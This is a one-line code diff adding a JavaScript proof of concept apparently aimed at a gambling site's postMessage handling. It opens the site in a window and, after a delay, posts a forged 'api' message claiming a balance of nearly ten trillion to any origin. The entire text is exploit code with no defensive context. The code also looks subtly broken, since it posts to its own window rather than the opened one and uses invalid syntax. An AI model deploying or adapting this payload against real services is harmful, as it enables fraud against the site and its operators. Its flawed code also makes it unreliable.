@@ -1,0 +1,1 @@
+function poc(){ window.win=window.open('https://brillx42.gg/'); var msg='42["api",{"type":"get","class":"user","module":"data","method":"balance","success":true,"data":9999999999990}]'; setTimeout(function(){window.postMessage(msg,'*');}, 5000)}()
